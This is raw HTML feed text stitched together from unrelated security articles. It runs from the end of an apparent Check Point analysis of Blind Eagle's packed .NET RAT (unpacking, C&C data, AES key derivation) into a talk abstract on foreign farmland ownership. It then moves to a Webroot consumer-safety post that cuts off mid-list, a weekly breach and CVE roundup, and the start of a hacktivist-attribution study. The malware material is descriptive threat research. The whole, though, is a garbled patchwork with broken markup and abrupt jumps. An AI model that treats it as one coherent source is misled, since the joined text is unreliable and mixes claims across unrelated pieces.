&lt;li&gt;&lt;strong&gt;Five&lt;/strong&gt; belonged to the &lt;strong&gt;Colombian government&lt;/strong&gt;.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;correo.policia.gov.co&lt;/li&gt;



&lt;li&gt;sic.gov.co&lt;/li&gt;



&lt;li&gt;contraloria.gov.co&lt;/li&gt;



&lt;li&gt;adr.gov.co&lt;/li&gt;



&lt;li&gt;dian.gov.co&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Fourteen&lt;/strong&gt; were associated with &lt;strong&gt;educational institutions&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;The remaining addresses belonged to &lt;strong&gt;businesses operating in Colombia&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;.NET RAT &amp;#8211; “Remcos Downloader”&lt;/h2&gt;



&lt;p&gt;The &lt;strong&gt;.NET RAT&lt;/strong&gt; delivered during the malware campaigns is protected with HeartCrypt, a &lt;a href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/"&gt;Packer-as-a-Service&lt;/a&gt; (PaaS) that emerged in early 2024 to obfuscate malware and evade detection by security software. This packer embeds malicious code into otherwise legitimate binaries, with the packed payload stored as a resource. When executed, HeartCrypt first unpacks a simple .NET packer, which is injected into and triggered within &lt;code&gt;csc.exe&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;This &lt;strong&gt;.NET packer&lt;/strong&gt; contains an embedded buffer that is:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Decrypted using AES&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Decompressed with GZIP&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Loaded into memory&lt;/strong&gt; as a .NET RAT assembly&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;In addition, the final executable (.NET RAT assembly) is obfuscated with &lt;strong&gt;NET-Reactor&lt;/strong&gt;, applying both &lt;strong&gt;string encryption&lt;/strong&gt; and &lt;strong&gt;control flow obfuscation&lt;/strong&gt; to further hinder analysis.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31223" height="468" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img10.png" width="893" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 12&lt;/strong&gt; &amp;#8211; .NET Packer, Unpacking process.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The majority of the strings are encrypted and stored inside a resource, which is immediately decrypted when execution begins. Then, each time a specific string is required, the malware requests it based on the index ID, where the index points to the &lt;strong&gt;DWORD&lt;/strong&gt; size of the string followed by the string content. The decrypted variable (containing the decrypted strings resource) follows the structure of how strings are stored in the &lt;code&gt;#US&lt;/code&gt; stream in .NET binaries. &lt;a href="https://github.com/SychicBoy/NETReactorSlayer"&gt;NETReactorSlayer&lt;/a&gt; (a well-known open-source deobfuscator for NET-Reactor-protected binaries) is able to decrypt those strings and deobfuscate such binaries.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31224" height="270" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img11-1024x270.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 13&lt;/strong&gt; &amp;#8211; Function that retrieves String based on index ID.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The decrypted resource contains a base64 string, which is deserialized and contains the malware configuration along with the C&amp;amp;C.&lt;/p&gt;

&lt;p&gt;The malware collects information regarding the execution, machine, and user, then serializes them using &lt;strong&gt;protobuf&lt;/strong&gt; and encrypts them using AES. Data sent to the C&amp;amp;C:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Bot ID&lt;/li&gt;



&lt;li&gt;Campaign ID &lt;code&gt;socialismo&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;Username&lt;/li&gt;



&lt;li&gt;OS Version&lt;/li&gt;



&lt;li&gt;Malware version &lt;code&gt;0.3.9&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;Antivirus installed&lt;/li&gt;



&lt;li&gt;Process Architecture&lt;/li&gt;



&lt;li&gt;Process name&lt;/li&gt;



&lt;li&gt;Machine specs …&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The malware attempts to retrieve IP addresses from the C&amp;amp;C domain name (&lt;code&gt;GetHostAddresses&lt;/code&gt;) and, if successful, sends the collected information.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31225" height="444" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img12.png" width="1010" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 14&lt;/strong&gt; &amp;#8211; GetHostAddresses with C&amp;amp;C.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Data is serialized, and machine information is sent along with the malware campaign &lt;code&gt;socialismo&lt;/code&gt; and version &lt;code&gt;0.3.9&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31226" height="444" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img13.png" width="1015" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 15&lt;/strong&gt; &amp;#8211; Data Serialization.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The AES key used to encrypt and decrypt network communications is derived by calling &lt;code&gt;Rfc2898DeriveBytes&lt;/code&gt; using as a password the mutex name &lt;code&gt;mono1234&lt;/code&gt; and salt &lt;code&gt;{ 1, 2, 23, 234, 37, 48, 134, 63, 248, 4 }&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31227" height="256" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img14.png" width="661" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 16&lt;/strong&gt; &amp;#8211; AES Key generation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;A similar process then retrieves the response from the C&amp;amp;C server, which responds with a buffer containing the DWORD size followed by the AES encrypted buffer. At this moment, Blind Eagle has utilized this RAT as a downloader, receiving a URL with the file being downloaded and injected either into &lt;code&gt;MSBuild.exe&lt;/code&gt; or &lt;code&gt;InstallUtil.exe&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31228" height="416" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img15.png" width="677" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 17&lt;/strong&gt; &amp;#8211; Random choice of process to be injected.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Even though &lt;strong&gt;Blind Eagle&lt;/strong&gt; uses this command the most, utilizing this .NET RAT as a simple downloader, the malware also contains other functionalities, such as downloading the next payload on disk, maintaining persistence via scheduled tasks, or even executing PowerShell scripts.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31229" height="398" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img16.png" width="671" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 18&lt;/strong&gt; &amp;#8211; Powershell file execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;Blind Eagle remains one of the most active and dangerous threat actors in Latin America, with a particular focus on Colombia’s public and private sectors. The group’s scale and persistence are evident, with over &lt;strong&gt;1,600&lt;/strong&gt; infections recorded from a single campaign. Long suspected of originating in Latin America, the confirmation of its &lt;strong&gt;UTC-5&lt;/strong&gt; operating timezone further narrows its likely base of operations to several &lt;strong&gt;South American&lt;/strong&gt; countries.&lt;/p&gt;



&lt;p&gt;Despite Microsoft&amp;#8217;s release of a patch for &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; on &lt;strong&gt;November 12, 2024&lt;/strong&gt;, Blind Eagle quickly adapted, introducing a variant of the “exploit” in just &lt;strong&gt;six days&lt;/strong&gt;. This rapid response highlights the group’s technical expertise, adaptability, and relentless pursuit of new attack methods. By incorporating malicious &lt;code&gt;.url&lt;/code&gt; files into its arsenal, Blind Eagle continues to refine its tactics, ensuring its malware distribution remains effective against evolving security defenses.&lt;/p&gt;



&lt;p&gt;A key factor in its success is its ability to exploit legitimate file-sharing platforms, including &lt;strong&gt;Google Drive&lt;/strong&gt;, &lt;strong&gt;Dropbox&lt;/strong&gt;, &lt;strong&gt;Bitbucket&lt;/strong&gt;, and &lt;strong&gt;GitHub&lt;/strong&gt;, allowing it to bypass traditional security measures and distribute malware stealthily. Additionally, its use of underground crimeware tools such as &lt;strong&gt;Remcos RAT&lt;/strong&gt;, &lt;strong&gt;HeartCrypt&lt;/strong&gt;, and &lt;strong&gt;PureCrypter&lt;/strong&gt; reinforces its deep ties to the cybercriminal ecosystem, granting access to sophisticated evasion techniques and persistent access methods.&lt;/p&gt;



&lt;p&gt;Blind Eagle’s rapid evolution, effective social engineering tactics, and focus on both public and private sector entities make it a critical cybersecurity threat. Mitigating its impact requires proactive threat intelligence, advanced security defenses, and continuous monitoring. Organizations must remain vigilant against phishing campaigns, file-based malware delivery, and unconventional attack techniques to stay ahead of this ever-adapting adversary.&lt;/p&gt;

In this deep dive into the secretive world of foreign investment in U.S. agricultural land, Kristin Del Rosso and Madeleine Devost explore the growing trend of foreign ownership, which has surged by 50% since 2017, and its profound implications for national security. Using the USDA’s data, the presenters shed light on how these investments could potentially impact everything from local economies to national defense.&lt;/p&gt;
&lt;p&gt;The talk dives into the complexities of the USDA’s data collection methods, revealing how manual processes and outdated systems obscure the true extent of foreign ownership. It also discusses the critical role of the Committee on Foreign Investment in the United States (CFIUS) in safeguarding national interests, and the urgent need for improved data sharing and automation between CFIUS and the USDA.&lt;/p&gt;
&lt;p&gt;Through real-life examples, including controversial land purchases near sensitive military sites, Kristin and Madeleine illustrate the potential risks and propose actionable recommendations to enhance transparency and security.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/03/03/national-consumer-protection-week-keeping-your-personal-data-safe-in-a-digitally-connected-world/" rel="nofollow"&gt;National Consumer Protection Week: Keeping your personal data safe in a digitally connected world&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;March is a time for leprechauns and four-leaf clovers, and as luck would have it, it’s also a time to learn how to protect your private data from cybercrime. Each year, the first week of March (March 2-8) is recognized as National Consumer Protection Week (NCPW). During this time, many government agencies and consumer protection organizations come together to help educate consumers on how to keep their personal and financial information secure.&lt;/p&gt;



&lt;p&gt;The event is sponsored by the &lt;a href="https://www.ftc.gov/" rel="noreferrer noopener" target="_blank"&gt;Federal Trade Commission&lt;/a&gt; (FTC), and other participating agencies include the &lt;a href="https://www.fdic.gov/consumer-resource-center/national-consumer-protection-week" rel="noreferrer noopener" target="_blank"&gt;Federal Deposit Insurance Corporation&lt;/a&gt; (FDIC), &lt;a href="https://states.aarp.org/maryland/national-consumer-protect-protection-tips" rel="noreferrer noopener" target="_blank"&gt;AARP&lt;/a&gt;,&amp;nbsp;and the&lt;a href="https://www.bbb.org/all/national-consumer-protection-week-partnership" rel="noreferrer noopener" target="_blank"&gt; Better Business Bureau&lt;/a&gt; (BBB). This month, take advantage of all that NCPW offers, including access to free tools and information that can help you identify and prevent online scams, fraud, and identity theft.&lt;/p&gt;



&lt;h2&gt;The growing risks to your data&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;During the third quarter of 2024, data breaches exposed more than &lt;a href="https://www.statista.com/statistics/1307426/number-of-data-breaches-worldwide/" rel="noreferrer noopener" target="_blank"&gt;422 million records worldwide.&lt;/a&gt; Millions of customers were put at risk when their social security numbers, phone numbers, and other sensitive personal information were leaked.&lt;/li&gt;



&lt;li&gt;As of 2024, the average cost of a data breach in the United States amounted to &lt;a href="https://www.statista.com/statistics/273575/us-average-cost-incurred-by-a-data-breach/" rel="noreferrer noopener" target="_blank"&gt;$9.36 million. &lt;/a&gt;In comparison, the&amp;nbsp;&lt;a href="https://www.statista.com/statistics/987474/global-average-cost-data-breach/" rel="noreferrer noopener" target="_blank"&gt;global average cost per data breach&lt;/a&gt;&amp;nbsp;was $4.88 million.&lt;/li&gt;



&lt;li&gt;The&amp;nbsp;&lt;a href="https://www.statista.com/statistics/1387393/loss-sensitive-information-organizations-cause-worldwide/" rel="noreferrer noopener" target="_blank"&gt;most common causes&lt;/a&gt;&amp;nbsp;of leaks were operating system (OS) flaws and weaknesses on devices like computers and phones. For example, when a user forgets to log out before they leave their computer, it can open the door for cybercriminals to steal information. In fact, it’s estimated that careless users are responsible for about 70% of sensitive data loss.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;Common attacks to consumer protection&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Identity theft and fraud&lt;/strong&gt;&lt;br /&gt;Some common types of identity theft and fraud include &lt;a href="https://www.experian.com/blogs/ask-experian/20-types-of-identity-theft-and-fraud/#a1" rel="noreferrer noopener" target="_blank"&gt;account takeover fraud&lt;/a&gt;, when criminals use stolen personal information such as account numbers, usernames, or passwords to hijack bank accounts, credit cards, and even email and social media accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Online shopping scams&lt;/strong&gt;&lt;br /&gt;An &lt;a href="https://www.wellsfargo.com/privacy-security/fraud/bank-scams/online-shopping-scams/" rel="noreferrer noopener" target="_blank"&gt;online shopping scam&lt;/a&gt; usually involves a fake online store or app, which appears legitimate and is promoted on social media or other authentic websites.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Financial fraud&lt;/strong&gt;&lt;br /&gt;With the advent of artificial intelligence (AI), financial fraud tactics are growing more sophisticated, and sadly, they often target older people. For example, &lt;a href="https://www.fcc.gov/grandparent-scams-get-more-sophisticated" rel="noreferrer noopener" target="_blank"&gt;grandparent scams&lt;/a&gt; happen when someone who sounds like a grandchild or other relative contacts an older person and asks them to send money via wire transfer to help get them out of trouble. Scammers use AI to clone voices, which helps them convince you that you’re sending money to a family member who desperately needs your help.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Medical identity theft&lt;/strong&gt;&lt;br /&gt;&lt;a href="https://www.equifax.com/personal/education/identity-theft/articles/-/learn/medical-identity-theft/" rel="noreferrer noopener" target="_blank"&gt;Medical identity theft&lt;/a&gt; happens when someone steals or uses your personal information like your name, Social Security number, or Medicare details, to get healthcare in your name. This kind of fraud can disrupt your medical care and cost a lot of money to resolve.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Social engineering attacks&lt;/strong&gt;&lt;br /&gt;&lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-social-engineering"&gt;Social engineering attacks&lt;/a&gt; occur when someone uses a fake persona to gain your trust. They deceive you into divulging confidential information so they can steal your money. Contact is usually made through social media, by phone or in person.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;How to protect yourself and your data&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Smart ways to secure your devices&lt;/strong&gt;
&lt;ul&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Orange Group has &lt;a href="https://www.techmonitor.ai/cybersecurity/orange-group-investigates-cyberattack-hacker-compromised-data/"&gt;confirmed&lt;/a&gt; a cyberattack on its Romanian branch, in which a hacker linked to the HellCat ransomware group stole 6.5GB of data over a month. The breach exposed 380,000 email addresses, internal documents, source code, invoices, contracts, and partial payment card details. While some data appears outdated, Orange assures that customer operations remain unaffected and is investigating the incident.&lt;/li&gt;
&lt;li&gt;The Medusa ransomware group has allegedly &lt;a href="https://www.suspectfile.com/exclusive-medusa-unveils-50tb-of-stolen-data-from-hcrgs-network-gaining-full-control-hcrg-labeled-liars-by-the-ransomware-group/"&gt;exfiltrated&lt;/a&gt; approximately 50TB of data from British healthcare provider HCRG Care Group&amp;#8217;s network, claiming full control over the healthcare provider&amp;#8217;s systems. Initially, Medusa reported stealing 2.275TB of data but later they revealed the breach was significantly larger, encompassing two HCRG subdomains. In response to HCRG&amp;#8217;s public statements minimizing the attack&amp;#8217;s impact, Medusa labeled the company as &amp;#8220;liars&amp;#8221; and provided evidence of the extensive data theft, including NTDS logs of the corporate network.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;Texas-based DM Clinical Research &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/dm-clinical-research-data-breach-exposes-over-1-6-million-sensitive-records"&gt;fell&lt;/a&gt; victim to a cyber-attack which resulted in the exposure of over 1.6 million sensitive records, including personal and clinical data. The incident is attributed to a misconfigured, non-password-protected database that was publicly accessible.&lt;/li&gt;
&lt;li&gt;The Philippine Army has &lt;a href="https://x.com/radyopilipinas1/status/1894508877808636157"&gt;confirmed&lt;/a&gt; a cyberattack, following claims by hacking group Exodus Security that it breached army systems and accessed sensitive military and personal records of 10,000 service members. While the army stated that the intrusion was contained with no confirmed data theft, Exodus Security alleges it obtained names, addresses, medical records, and financial details.&lt;/li&gt;
&lt;li&gt;Cleveland Municipal Court has &lt;a href="https://therecord.media/cyber-incident-shuts-down-cleveland-municipal-court"&gt;experienced&lt;/a&gt; a cyber incident that forced the shutdown of its internal systems and software platforms, leading to its closure since February 23.

&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A critical remote code execution vulnerability (CVE-2025-27364) was &lt;a href="https://medium.com/@mitrecaldera/mitre-caldera-security-advisory-remote-code-execution-cve-2025-27364-5f679e2e2a0e"&gt;discovered&lt;/a&gt; in MITRE Caldera. This flaw resides in the dynamic agent compilation functionality of the server, specifically affecting the Manx and Sandcat agents. Exploitation allows remote attackers to execute arbitrary code on the server hosting Caldera by sending crafted web requests to the server&amp;#8217;s API used for compiling and downloading these agents. The vulnerability is particularly concerning because it can be triggered without authentication, and the necessary dependencies (Go, Python, and GCC) are typically present in default configurations.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat&lt;/em&gt;&lt;em&gt; (MITRE Caldera Remote Code Execution (CVE-2025-27364))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers have &lt;a href="https://cybersecuritynews.com/exim-mail-transfer-vulnerability/#google_vignette"&gt;uncovered&lt;/a&gt; a critical SQL injection flaw (CVE-2025-26794) in Exim version 4.98 with SQLite hints database functionality. Attackers can insert malicious SQL code via specially crafted email transactions, leading to potential unauthorized access, data extraction, or full system compromise.&lt;/li&gt;
&lt;li&gt;A patch was &lt;a href="https://www.wordfence.com/blog/2025/02/100000-wordpress-sites-affected-by-arbitrary-file-upload-read-and-deletion-vulnerability-in-everest-forms-wordpress-plugin/"&gt;released&lt;/a&gt; for a critical vulnerability (CVE-2025-1128) in the Everest Forms plugin (versions up to 3.0.9.4) that allows unauthenticated file upload, read, and deletion. Successful exploitation could lead to remote code execution, site takeover, and arbitrary file manipulation. The issue was resolved in version 3.0.9.5.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/large-scale-exploitation-of-legacy-driver/"&gt;uncovered&lt;/a&gt; a large-scale campaign exploiting over 2,500 variants of the vulnerable Truesight.sys driver (version 2.0.2), known as the RogueKiller Antirootkit Driver. Attackers leveraged a Windows policy loophole to load this legacy driver on the latest OS versions, bypassing security measures like the Microsoft Vulnerable Driver Blocklist. They distributed the driver through phishing methods, disguising malicious samples as legitimate applications, primarily targeting victims in China and other parts of Asia. The campaign&amp;#8217;s sophistication underscores the need for vigilant security practices and timely updates to security policies.&lt;br /&gt;&lt;br /&gt;Check&lt;em&gt; Point Threat Emulation and Harmony Endpoint provide coverage against this threat.&lt;br /&gt;&lt;/em&gt;&lt;em&gt;(Backdoor.Wins.Truesight.A, Gen.Rep.sys, Behavioral.Sideloading.p)&lt;br /&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/modern-approach-to-attributing-hacktivist-groups/"&gt;analyzed&lt;/a&gt; the evolution of hacktivist groups, which have shifted from minor website defacements and DDoS attacks to sophisticated operations resembling state-sponsored activities. To improve attribution, researchers are now employing language-based machine-learning models and linguistic analysis. By examining thousands of public messages from various hacktivist groups, this modern approach integrates traditional cyber threat intelligence with advanced technologies to uncover key topics, motivations, and potential connections, enhancing the accuracy of hacktivist group attribution.&lt;/li&gt;

&lt;p&gt;Over the past few decades, hacktivism has been, in a lot of cases, characterized by minor website defacements and distributed denial-of-service (DDoS) attacks, which, while making headlines, had minimal lasting impact. However, in recent years, we have observed a significant shift in the nature of these activities. Groups that appear to be state-sponsored, yet masquerade as hacktivists, are now conducting large-scale cyber and influence operations. These actors often use various group names and grassroots facades to maintain anonymity and reduce international backlash. These sophisticated attacks serve as powerful tools for political and social influence, providing plausible deniability and the illusion of legitimacy, thereby evading direct government attribution.&lt;/p&gt;



&lt;p&gt;This research explores whether such operations&amp;#8217; growing popularity and wide and repeating adoption might also be their Achilles&amp;#8217; heel. &lt;strong&gt;We introduce a new approach to attributing hacktivist groups by employing language-based machine-learning models and linguistic analysis.&lt;/strong&gt; Our study examines thousands of public messages from dozens of hacktivist groups, integrating traditional cyber threat intelligence methods with modern machine learning technologies. &lt;strong&gt;This combined approach aims to uncover the key topics discussed by these groups, understand their motivations over time, tie some of these groups together, and improve the way we do attribution when it comes to hacktivism.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;Hacktivism, a blend of hacking and activism, has evolved dramatically since its inception. Emerging in the 1980s with groups like the Cult of the Dead Cow, which pioneered the concept of hacktivism, the phenomenon has grown from a fringe subculture into a significant force in global cyber politics. Early hacktivists targeted symbolic institutions and networks, aiming to draw attention to various social and political issues. The 1990s and 2000s saw the rise of more organized groups like Anonymous, whose operations, from the&amp;nbsp;&lt;a href="https://www.theguardian.com/technology/2008/feb/04/news"&gt;&lt;u&gt;2008 Scientology attacks&lt;/u&gt;&lt;/a&gt;&amp;nbsp;to the&amp;nbsp;&lt;a href="https://en.wikipedia.org/wiki/Operation_Payback"&gt;&lt;u&gt;2010 PayPal protests&lt;/u&gt;&lt;/a&gt;, showcased the potential of digital activism. Today, hacktivism is not just about defacing websites or DDoS attacks—it has become a sophisticated tool in the arsenal of state and non-state actors alike, influencing geopolitical landscapes worldwide.&lt;/p&gt;



&lt;p&gt;One of the most significant developments in hacktivism in recent years is the involvement of nation-state actors. Governments have recognized the strategic value of hacktivist methods, adopting and adapting them for their own purposes. Nations employ cyber operatives to conduct operations that mimic grassroots hacktivism. These activities often aim to sow discord, influence public opinion, or undermine political adversaries while maintaining plausible deniability. By cloaking their actions in the guise of independent hacktivism, governments can achieve their goals without direct attribution, complicating international responses and accountability.&lt;/p&gt;



&lt;p&gt;State-sponsored entities often stage operations to appear as though they are the work of independent hacktivists, thereby muddling the waters of attribution. They often operate multiple, sometimes dozens, of groups that appear to act independently. This strategy not only serves to mislead targets but also to discredit genuine activist movements by associating them with state agendas. Such deceptive tactics complicate the global cyber landscape, making it challenging to distinguish between actual hacktivist actions and state-sponsored subterfuge.&lt;/p&gt;



&lt;p&gt;In recent years, ever since this shift in the hacktivism landscape started, Check Point Research has been tracking dozens of hacktivism groups — some are operated by groups of hackers with mutual ideology or interest, and others by nation-state actors masquerade as hacktivists. Our investigations have led to several published articles detailing&amp;nbsp;&lt;a href="https://research.checkpoint.com/2022/the-new-era-of-hacktivism/"&gt;&lt;u&gt;significant operations&lt;/u&gt;&lt;/a&gt;&amp;nbsp;we believe were conducted by these state actors. In some cases, we have successfully&amp;nbsp;&lt;a href="https://research.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iran/"&gt;&lt;u&gt;linked&lt;/u&gt;&lt;/a&gt;&amp;nbsp;different hacktivist groups to a single operator, piercing their veil of anonymity. Our research has employed traditional threat intelligence and investigative methods, such as binary analysis, code similarity, and the Diamond Model of Intrusion Analysis. For instance, we demonstrated how one hacktivist group used the same unique tools and methods as another group targeting different entities years earlier, suggesting they were the same group. However, since then, nation-state hacktivist groups have refined their techniques, trying even harder to obscure their tracks and act independently.&lt;/p&gt;



&lt;p&gt;Tracking these groups has provided us with valuable insights into their motives, attack tactics, and usual targets. Our researchers have developed various theories and hypotheses regarding the operators behind these groups, suspecting that many are run, either directly or indirectly, by the intelligence agencies of different nation-states. The recent major geopolitical events, such as the Russian invasion of Ukraine and the conflict between Israel and Hamas, have highlighted shifts that would have otherwise gone unnoticed. In response to these events, hacking groups that had been inactive for years suddenly resurfaced, often with new focus areas. Independent groups began to echo similar messages, sometimes even referencing one another. These conflicts created a fertile ground for the emergence of new groups and cyber personas at an astonishing pace.&lt;/p&gt;



&lt;p&gt;The increased frequency of hacktivist operations and the rise of new groups have added complexity to the cyber threat landscape. The rapid formation and dissolution of these groups, coupled with their ability to adapt quickly to geopolitical changes, make it challenging for threat researchers to manually keep track of them. Recognizing that relying on gut feeling and intuition is not a solid approach to threat intelligence, we decided to explore more reliable, robust, and consistent methods.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="methodology"&gt;Methodology&lt;/h3&gt;



&lt;p&gt;In order to address our research questions and tackle the complexities we presented, we adopted a combined approach utilizing Topic Modeling and Stylometric analysis. This decision was driven by the need for better methods to analyze the vast amount of textual data written by hacktivist groups. By integrating language-based machine learning models and linguistic analysis, we aim to systematically uncover the motivations behind hacktivist activities, identify connections between different groups, and enhance the attribution of these operations to specific actors.&lt;/p&gt;



&lt;p&gt;Topic Modeling helps us understand the key themes and topics discussed by these groups over time. It allows us to answer questions such as: What are the main goals and targets of these hacktivist groups? How do their focus areas change in response to geopolitical events? By analyzing the content of the groups’ social media messages, we can identify clusters of topics and track their evolution, providing insights into the strategic objectives of these actors.&lt;/p&gt;



&lt;p&gt;Stylometric analysis, on the other hand, focuses on the unique writing styles of different groups. By examining features like word choice, sentence structure, and other linguistic patterns, we can answer questions such as: Can we tie different hacktivist groups together based on their writing style? Are there groups with similar textual fingerprints that might indicate common authorship or collaboration? This analysis helps us build a network of connections between different groups, offering a deeper understanding of their relationships and potentially revealing the operators behind these cyber personas.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="data-collection"&gt;Data Collection&lt;/h3&gt;



&lt;p&gt;To conduct this research, we collected data from the social media accounts and messages of hacktivist groups believed to be operated by nation-state actors. The primary sources of data were Twitter and Telegram, as these platforms are commonly used by hacktivist groups to disseminate their messages. The collection process involved several steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Identification of Target Accounts&lt;/strong&gt;: Although there are hundreds of social media accounts associated with cyber-personas of hacktivist groups, many of these accounts are either inactive or not backed by nation-state actors. We chose 35 hacktivist accounts that are active and potentially state-sponsored. These accounts were selected based on their activity, the nature of their messages, and previous reports linking them to nation-state actors. They represent a diverse range of targets and objectives, posting in languages such as English, Russian, Ukrainian, Persian, Hebrew, Hindi, and more. Some of these accounts are active on both Telegram and Twitter, often managing multiple accounts, including backup accounts. For each group, we noted all directly associated accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Extraction:&lt;/strong&gt;&amp;nbsp;To gather all messages from X, we utilized the official API to retrieve tweets and replies from these accounts. Although retweets might also indicate the topics of interest to these accounts, we chose not to include them due to their lower reliability compared to original tweets and replies. For Telegram, we used the Telegram Desktop application to export all messages published by channels operated by these hacktivist groups. In total, we collected approximately 20,000 tweets and messages from these accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Cleaning&lt;/strong&gt;: The raw data extracted from social media platforms included various elements such as URLs, hashtags, emojis, and special characters. For the topic modeling algorithm, we cleaned the data by removing these elements to focus on the textual content. Additionally, non-English messages were translated into English to maintain consistency. However, for the stylometric analysis, we retained these elements. Since our stylometric models support multiple languages, we preserved the original language and did not translate these messages.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Storage:&lt;/strong&gt;&amp;nbsp;The cleaned data was stored in a structured format, making it suitable for further analysis. Each message was tagged with metadata, including the date of publication, the originating account, and the code of the original language.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Having all the data structured and ready for analysis we moved on to the analysis.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="topic-modeling"&gt;Topic Modeling&lt;/h3&gt;



